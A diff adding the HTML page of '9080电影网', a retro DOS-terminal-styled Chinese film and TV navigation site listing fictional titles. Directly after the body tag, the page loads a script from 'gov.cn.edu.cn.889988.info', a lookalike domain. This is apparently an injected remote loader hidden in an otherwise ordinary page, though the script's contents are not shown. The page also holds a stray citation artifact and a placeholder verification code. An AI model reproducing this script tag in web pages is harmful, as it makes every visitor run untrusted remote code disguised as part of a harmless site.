@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>9080电影网 - 90年代终端怀旧影视导航</title>
+<meta name="description" content="9080电影网(https://9080dianyingwang-h5.github.io)以90年代电脑终端/网吧怀旧风整理最新电影、热播剧集、综艺娱乐、动漫专区，仅做影视信息导航。">
+<meta name="keywords" content="9080电影网,9080,电影,电视剧,综艺,动漫,终端风,怀旧影视,CRT">
+<meta name="author" content="9080电影网">
+<meta name="robots" content="index,follow">
+<meta name="msvalidate.01" content="BING_VERIFICATION_CODE">
+<meta property="og:title" content="9080电影网 - 90年代终端怀旧影视导航">
+<meta property="og:description" content="9080电影网：C:\> PLAY MOVIE.EXE —— 片单像老电脑目录。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://9080dianyingwang-h5.github.io">
+<meta property="og:site_name" content="9080电影网">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"9080电影网",
+  "url":"https://9080dianyingwang-h5.github.io",
+  "description":"90年代终端怀旧风影视信息导航站",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://9080dianyingwang-h5.github.io#search={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#031a12;
+  --bg2:#06251b;
+  --term:#39ff7a;
+  --term-dim:#1f9c4d;
+  --amber:#ffb000;
+  --crt:#0a0f0d;
+  --ink:#cfeede;
+  --muted:#6fae8e;
+  --line:rgba(57,255,122,.25);
+}
+body{
+  font-family:"Courier New",Consolas,"PingFang SC","Microsoft YaHei",monospace;
+  background:
+    radial-gradient(800px 500px at 50% -10%, rgba(57,255,122,.12), transparent 60%),
+    linear-gradient(180deg,var(--bg),var(--bg2));
+  color:var(--ink);
+  line-height:1.7;
+  overflow-x:hidden;
+}
+/* CRT 扫描线 */
+body::before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;
+  background:repeating-linear-gradient(0deg,rgba(0,0,0,.18) 0 1px,transparent 1px 3px);
+  mix-blend-mode:multiply;opacity:.5;
+}
+/* 屏幕微弧 */
+body::after{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:9998;
+  box-shadow:inset 0 0 120px rgba(0,0,0,.7);
+}
+a{text-decoration:none;color:var(--term);transition:.2s}
+
+.bar{background:#02120c;border-bottom:1px solid var(--line)}
+.bar-in{max-width:1100px;margin:0 auto;padding:10px 18px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.win{font-size:13px;color:var(--amber);border:1px solid var(--amber);padding:3px 10px;border-radius:3px;font-weight:700}
+.title{font-size:18px;font-weight:900;color:var(--term);letter-spacing:1px}
+.title b{color:var(--amber)}
+.sys{margin-left:auto;font-size:12px;color:var(--muted)}
+.blink{animation:blink 1s steps(2) infinite}
+@keyframes blink{50%{opacity:0}}
+
+.cmd{max-width:1100px;margin:0 auto;padding:26px 18px 10px;font-size:13px;color:var(--term-dim)}
+.cmd b{color:var(--term)}
+.prompt{color:var(--amber)}
+
+.hero{max-width:1100px;margin:0 auto;padding:20px 18px 40px}
+.screen{border:2px solid var(--line);border-radius:14px;background:linear-gradient(180deg,rgba(10,15,13,.9),rgba(3,26,18,.95));
+  padding:34px 26px;box-shadow:0 0 40px rgba(57,255,122,.15), inset 0 0 60px rgba(0,0,0,.6)}
+.screen .line{font-size:13px;color:var(--term-dim);margin-bottom:6px}
+.screen h1{font-size:clamp(30px,7vw,56px);font-weight:900;color:var(--term);text-shadow:0 0 18px rgba(57,255,122,.5);margin:8px 0}
+.screen h1 span{color:var(--amber)}
+.screen p{max-width:680px;color:var(--ink);font-size:14px;margin:10px 0 18px}
+.url{display:inline-block;background:#02120c;border:1px solid var(--term);color:var(--term);padding:8px 16px;border-radius:4px;font-size:13px}
+.cursor{display:inline-block;width:9px;height:16px;background:var(--term);margin-left:4px;vertical-align:-2px;animation:blink 1s steps(2) infinite}
+
+.section{max-width:1100px;margin:0 auto;padding:30px 18px}
+.sec-title{font-size:14px;color:var(--amber);border-left:4px solid var(--amber);padding-left:10px;margin-bottom:16px}
+.sec-title b{color:var(--term)}
+
+/* DOS 目录列表 */
+.dir{border:1px solid var(--line);border-radius:10px;background:rgba(2,18,12,.7);overflow:hidden}
+.dir-row{display:grid;grid-template-columns:34px 1.4fr 1fr 90px 70px;gap:10px;padding:12px 16px;border-bottom:1px dashed var(--line);align-items:center;font-size:13px}
+.dir-row:last-child{border-bottom:none}
+.dir-row.head{background:rgba(57,255,122,.08);color:var(--amber);font-weight:700}
+.dir-row .ext{color:var(--amber)}
+.dir-row .sz{color:var(--muted);text-align:right}
+.dir-row .yr{color:var(--term-dim);text-align:right}
+.dir-row:hover{background:rgba(57,255,122,.06)}
+.folder{color:var(--amber)}
+.file{color:var(--term)}
+
+/* 综艺：弹窗 */
+.popgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.pop{background:#02120c;border:1px solid var(--line);border-radius:8px;padding:0;overflow:hidden}
+.pop .title-bar{background:var(--term-dim);color:#02120c;font-size:12px;font-weight:700;padding:6px 10px;display:flex;justify-content:space-between}
+.pop .title-bar span:last-child{background:#02120c;color:var(--term);border-radius:2px;padding:0 6px}
+.pop .body{padding:16px}
+.pop .body .ico{font-size:30px}
+.pop h3{font-size:15px;color:var(--term);margin:8px 0 4px}
+.pop p{font-size:12px;color:var(--muted)}
+
+/* 动漫：进度条 */
+.anime{display:flex;flex-direction:column;gap:12px}
+.load{background:#02120c;border:1px solid var(--line);border-radius:8px;padding:12px 16px}
+.load .top{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.load .top .e{font-size:22px}
+.load h3{font-size:14px;color:var(--term);font-weight:700}
+.load .pct{margin-left:auto;font-size:12px;color:var(--amber)}
+.bar-bg{height:10px;background:#03281c;border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.bar-fill{height:100%;background:linear-gradient(90deg,var(--term-dim),var(--term));box-shadow:0 0 10px rgba(57,255,122,.5)}
+
+/* 关于：readme */
+.readme{max-width:1100px;margin:0 auto;padding:10px 18px 50px}
+.md{border:1px solid var(--line);border-radius:10px;background:rgba(2,18,12,.75);padding:26px;font-size:14px;color:var(--ink)}
+.md h3{color:var(--amber);font-size:18px;margin-bottom:12px}
+.md p{margin-bottom:10px}
+.md b{color:var(--term)}
+.md ul{margin:8px 0 8px 20px;color:var(--muted)}
+.md li{margin-bottom:6px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:18px}
+.stat{background:#02120c;border:1px solid var(--line);border-radius:8px;padding:16px;text-align:center}
+.stat .v{font-size:22px;font-weight:900;color:var(--term)}
+.stat .l{font-size:12px;color:var(--muted);margin-top:4px}
+
+.footer{background:#02120c;border-top:1px solid var(--line);padding:30px 18px 22px;text-align:center}
+.footer .lg{font-size:18px;font-weight:900;color:var(--term)}
+.footer .lg b{color:var(--amber)}
+.footer .links{display:flex;justify-content:center;gap:18px;flex-wrap:wrap;margin:12px 0;font-size:13px}
+.footer .cp{font-size:12px;color:var(--muted);line-height:1.9}
+.footer .cp a{color:var(--term)}
+
+@media(max-width:768px){
+  .dir-row{grid-template-columns:28px 1.3fr 80px 60px}
+  .dir-row .col-type{display:none}
+  .stats{grid-template-columns:1fr 1fr}
+  .sys{display:none}
+}
+@media(max-width:480px){
+  .screen{padding:24px 16px}
+  .popgrid{grid-template-columns:1fr}
+  .dir-row{grid-template-columns:24px 1fr 56px;font-size:12px}
+  .dir-row .sz{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bar">
+  <div class="bar-in">
+    <div class="win">MS-DOS</div>
+    <div class="title">9080<b>电影网</b>.EXE</div>
+    <div class="sys">MEM: 640K OK ｜ NET: 56K MODEM ｜ <span class="blink">● ONLINE</span></div>
+  </div>
+</div>
+
+<div class="cmd">
+  C:\9080&gt; <span class="prompt">DIR</span> /MOVIE /SORT:DATE &nbsp;—&nbsp; <b>加载影视片单中...</b> <span class="cursor"></span>
+</div>
+
+<header class="hero">
+  <div class="screen">
+    <div class="line">C:\9080&gt; RUN CINEMA.SYS</div>
+    <div class="line">&gt; 正在挂载：最新电影 / 热播剧集 / 综艺娱乐 / 动漫专区 ...</div>
+    <h1>9080<span>电影网</span></h1>
+    <p>90 年代网吧味：CRT 扫描线、绿莹莹终端字、拨号上网的等待感。本站只把电影/剧集/综艺/动漫整理成“目录列表”，<b>不托管视频、不聚合非法播放源、不挂盗版直链</b>。</p>
+    <div class="url">🔗 https://9080dianyingwang-h5.github.io <span class="cursor"></span></div>
+  </div>
+</header>
+
+<section class="section" id="movies">
+  <div class="sec-title">C:\9080\MOVIES &gt; <b>最新电影.DIR</b></div>
+  <div class="dir">
+    <div class="dir-row head"><div>#</div><div>文件名</div><div class="col-type">类型</div><div class="sz">大小/评分</div><div class="yr">年份</div></div>
+    <div class="dir-row"><div class="folder">📁</div><div class="file">星际拨号.exe</div><div class="col-type">科幻</div><div class="sz">8.9★</div><div class="yr">2026</div></div>
+    <div class="dir-row"><div class="folder">📁</div><div class="file">录像厅幽灵.avi</div><div class="col-type">悬疑</div><div class="sz">8.5★</div><div class="yr">2026</div></div>
+    <div class="dir-row"><div class="folder">📁</div><div class="file">软盘情书.txt</div><div class="col-type">爱情</div><div class="sz">8.2★</div><div class="yr">2026</div></div>
+    <div class="dir-row"><div class="folder">📁</div><div class="file">调制解调器大战.mov</div><div class="col-type">动作</div><div class="sz">8.7★</div><div class="yr">2026</div></div>
+    <div class="dir-row"><div class="folder">📁</div><div class="file">像素江湖.com</div><div class="col-type">武侠</div><div class="sz">9.0★</div><div class="yr">2026</div></div>
+    <div class="dir-row"><div class="folder">📁</div><div class="file">午夜机房.iso</div><div class="col-type">惊悚</div><div class="sz">8.4★</div><div class="yr">2026</div></div>
+  </div>
+</section>
+
+<section class="section" id="tv">
+  <div class="sec-title">C:\9080\TV &gt; <b>热播剧集.DIR</b></div>
+  <div class="dir">
+    <div class="dir-row head"><div>#</div><div>文件名</div><div class="col-type">类型</div><div class="sz">进度</div><div class="yr">集数</div></div>
+    <div class="dir-row"><div class="file">📺</div><div class="file">拨号爱情故事.epg</div><div class="col-type">都市</div><div class="sz">热更</div><div class="yr">24</div></div>
+    <div class="dir-row"><div class="file">📺</div><div class="file">老机房的灯.epg</div><div class="col-type">年代</div><div class="sz">热更</div><div class="yr">18</div></div>
+    <div class="dir-row"><div class="file">📺</div><div class="file">BBS江湖.epg</div><div class="col-type">武侠</div><div class="sz">热更</div><div class="yr">30</div></div>
+    <div class="dir-row"><div class="file">📺</div><div class="file">软盘神探.epg</div><div class="col-type">悬疑</div><div class="sz">新更</div><div class="yr">12</div></div>
+    <div class="dir-row"><div class="file">📺</div><div class="file">网吧夜未央.epg</div><div class="col-type">群像</div><div class="sz">热更</div><div class="yr">20</div></div>
+  </div>
+</section>
+
+<section class="section" id="shows">
+  <div class="sec-title">C:\9080\VARIETY &gt; <b>综艺娱乐.WIN</b></div>
+  <div class="popgrid">
+    <div class="pop"><div class="title-bar">SHOW_01 <span>_ □ X</span></div><div class="body"><div class="ico">🖱️</div><h3>拨号点歌台</h3><p>56K 猫叫之后，嘉宾连麦点老歌</p></div></div>
+    <div class="pop"><div class="title-bar">SHOW_02 <span>_ □ X</span></div><div class="body"><div class="ico">💾</div><h3>软盘挑战赛</h3><p>1.44MB 里塞进最多笑点</p></div></div>
+    <div class="pop"><div class="title-bar">SHOW_03 <span>_ □ X</span></div><div class="body"><div class="ico">🕹️</div><h3>街机厅之夜</h3><p>拳皇97、三国战纪现场PK</p></div></div>
+    <div class="pop"><div class="title-bar">SHOW_04 <span>_ □ X</span></div><div class="body"><div class="ico">📠</div><h3>传真情书局</h3><p>把情书从老传真机里念出来</p></div></div>
+    <div class="pop"><div class="title-bar">SHOW_05 <span>_ □ X</span></div><div class="body"><div class="ico">🖥️</div><h3>装机不翻车</h3><p>Win98 装机竞速+怀旧硬件谈</p></div></div>
+    <div class="pop"><div class="title-bar">SHOW_06 <span>_ □ X</span></div><div class="body"><div class="ico">📻</div><h3>午夜电台.exe</h3><p>播客式聊片，BGM 是调制解调器</p></div></div>
+  </div>
+</section>
+
+<section class="section" id="anime">
+  <div class="sec-title">C:\9080\ANIME &gt; <b>动漫专区.LOAD</b></div>
+  <div class="anime">
+    <div class="load"><div class="top"><div class="e">🤖</div><h3>像素机器人传说</h3><div class="pct">87%</div></div><div class="bar-bg"><div class="bar-fill" style="width:87%"></div></div></div>
+    <div class="load"><div class="top"><div class="e">👾</div><h3>8-bit 妖怪录</h3><div class="pct">74%</div></div><div class="bar-bg"><div class="bar-fill" style="width:74%"></div></div></div>
+    <div class="load"><div class="top"><div class="e">🛸</div><h3>UFO 菜市场</h3><div class="pct">92%</div></div><div class="bar-bg"><div class="bar-fill" style="width:92%"></div></div></div>
+    <div class="load"><div class="top"><div class="e">🧃</div><h3>果汁电池小子</h3><div class="pct">68%</div></div><div class="bar-bg"><div class="bar-fill" style="width:68%"></div></div></div>
+    <div class="load"><div class="top"><div class="e">🕹️</div><h3>街机勇者传</h3><div class="pct">81%</div></div><div class="bar-bg"><div class="bar-fill" style="width:81%"></div></div></div>
+    <div class="load"><div class="top"><div class="e">💾</div><h3>软盘精灵</h3><div class="pct">95%</div></div><div class="bar-bg"><div class="bar-fill" style="width:95%"></div></div></div>
+  </div>
+</section>
+
+<section class="readme" id="about">
+  <div class="sec-title">C:\9080\README.TXT &gt; <b>关于我们</b></div>
+  <div class="md">
+    <h3>9080电影网 — README.TXT</h3>
+    <p><b>9080电影网</b>（https://9080dianyingwang-h5.github.io）是一个 90 年代电脑终端/网吧怀旧风的<b>影视信息导航站</b>。</p>
+    <p>站名延续 7080 / 8090 的“年代号影视站”传统；页面用 DOS 目录、CRT 扫描线、Win 弹窗、进度条来排片单。</p>
+    <ul>
+      <li>不托管视频文件</li>
+      <li>不提供盗版在线播放直链</li>
+      <li>不聚合非法广播电视/视听节目源</li>
+      <li>仅展示影视信息 + 正版/公开平台入口</li>
+    </ul>
+    <p>无《信息网络传播视听节目许可证》的个人静态站，做“索引/导航/资料”最稳。[4](@ref)</p>
+    <div class="stats">
+      <div class="stat"><div class="v">4+</div><div class="l">影视栏目</div></div>
+      <div class="stat"><div class="v">1990s</div><div class="l">视觉年代</div></div>
+      <div class="stat"><div class="v">0</div><div class="l">盗版直链</div></div>
+      <div class="stat"><div class="v">100%</div><div class="l">静态可收录</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="lg">9080<b>电影网</b></div>
+  <div class="links">
+    <a href="#movies">MOVIES</a>
+    <a href="#tv">TV</a>
+    <a href="#shows">VARIETY</a>
+    <a href="#anime">ANIME</a>
+    <a href="#about">README</a>
+  </div>
+  <div class="cp">
+    C:\9080&gt; EXIT ｜ 网站名称：9080电影网 ｜ 网址：<a href="https://9080dianyingwang-h5.github.io">https://9080dianyingwang-h5.github.io</a><br>
+    © 2026 9080电影网 · 拨号声一响，好片加载完 ｜ 本站仅展示影视信息，资源来自互联网公开内容/正版平台。
+  </div>
+</footer>
+
+</body>
+</html>
